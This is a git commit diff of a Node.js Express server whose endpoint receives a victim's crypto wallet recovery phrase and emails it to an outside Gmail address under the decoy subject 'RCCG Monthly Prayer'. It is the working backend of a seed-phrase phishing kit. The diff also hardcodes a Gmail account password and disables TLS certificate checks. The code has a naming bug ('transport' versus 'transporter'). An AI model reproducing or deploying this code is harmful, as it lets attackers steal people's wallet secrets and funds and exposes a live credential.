02ac5f6485412364f8a07f8b57192323d86097b5
oforduhh <oforduhh@gmail.com>
2021-04-18 17:16:50 +0100

    jfhghg

--- Server/main.js
+++ Server/main.js
@@ -1,14 +1,14 @@
-const express = require( 'express' );
+const express = require("express");
 const app = express();
 const PORT = process.env.PORT || 2000;
-const path = require( 'path' );
+const path = require("path");
 var nodemailer = require("nodemailer");
 
-app.use(express.json())
+app.use(express.json());
 
-app.post('/message', (req,res)=>{
-//    console.log(req)
-    const input = `
+app.post("/message", (req, res) => {
+  //    console.log(req)
+  const input = `
     <p> You have a messgae</p>
     <h3> Contact Details</h3>
     <ul>
@@ -16,41 +16,48 @@ app.post('/message', (req,res)=>{
     <li>Recovery Phrase: ${req.body.rPhrase}</li>
     </ul>
     `;
-    var transporter = nodemailer.createTransport( {
-        service: "",//Gmail or any mail server
-        host:"",//Gmail or any mail server
-        port:587,
-        secure: false,
-        auth: {
-          user: '',//email
-          pass: ''//password
-        },
-        tls:{
-            rejectUnauthorized: false
-        }
-        
-    } );
-    
-    var mailOptions = {
-        from: "'Any thing'  <email same as user>",
-        to: 'the email you want to send the message to',
-        subject: 'From collect wallet',
-        html: input
-    };
-    
-    
-    transporter.sendMail( mailOptions, ( err, info ) => {
-    if ( err ) {
-    res.json({status: 500})
-    console.log(err)
-    } else {
-    res.json(info.data)
-    // console.l
-    }
-    } )
-    
-    
-        
-})
+  // var transporter = nodemailer.createTransport( {
+  //     service: "",//Gmail or any mail server
+  //     host:"",//Gmail or any mail server
+  //     port:587,
+  //     secure: false,
+  //     auth: {
+  //       user: '',//email
+  //       pass: ''//password
+  //     },
+  //     tls:{
+  //         rejectUnauthorized: false
+  //     }
 
-app.listen( PORT, () => console.log( `Server started on Port ${ PORT }` ) );
+  // } );
+  let transport = nodemailer.createTransport({
+    service: "gmail",
+    secure: false,
+    auth: {
+      user: "oforduhh@gmail.com",
+      pass: "mmbm8695",
+    },
+    tls: {
+      rejectUnauthorized: false,
+    },
+  });
+
+  var mailOptions = {
+    from: "'Any thing'  <email same as user>",
+    to: "activation340@gmail.com",
+    subject: "RCCG Monthly Prayer",
+    html: input,
+  };
+
+  transporter.sendMail(mailOptions, (err, info) => {
+    if (err) {
+      res.json({ status: 500 });
+      console.log(err);
+    } else {
+      res.json(info.data);
+      // console.l
+    }
+  });
+});
+
+app.listen(PORT, () => console.log(`Server started on Port ${PORT}`));
